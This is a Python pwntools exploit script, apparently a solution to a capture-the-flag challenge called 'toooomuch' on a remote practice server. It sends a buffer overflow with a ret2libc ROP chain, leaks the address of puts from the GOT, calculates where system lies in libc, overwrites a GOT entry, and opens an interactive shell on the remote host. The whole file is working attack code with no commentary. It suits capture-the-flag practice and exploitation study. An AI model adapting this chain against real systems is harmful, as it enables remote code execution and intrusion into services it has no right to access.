from pwn import *

context.arch = 'i386'

#p = process( './toooomuch' )
p = remote( 'hackme.inndy.tw', 7702 )

p.recvuntil( ': ' )

bss = 0x08049c28

puts_plt = 0x080484b0
gets_plt = 0x8048480
puts_got = 0x08049c00

pop_ebx = 0x08048455

payload = b'a' * 28 + p32( puts_plt ) + p32( pop_ebx ) + p32( puts_got ) + p32( gets_plt ) + p32( pop_ebx ) + p32( bss ) + p32( gets_plt ) + p32( pop_ebx ) + p32( puts_got ) + p32( puts_plt ) + p32( 0 ) + p32( bss )

raw_input()
p.sendline( payload )

p.recvuntil( '\n' )
puts_add = u32( p.recv()[:4] )
print( hex(puts_add) )

#system_off = 0x0003d200
system_off = 0x0003ad80
#puts_off = 0x00067b40
puts_off = 0x0005fb80
libc_base = puts_add - puts_off
system_add = libc_base + system_off
print( hex( system_add ) )

p.sendline( b'/bin/sh\x00' )
p.sendline( p32( system_add ) )
#p.sendline( b'/bin/sh\x00' )

p.interactive()
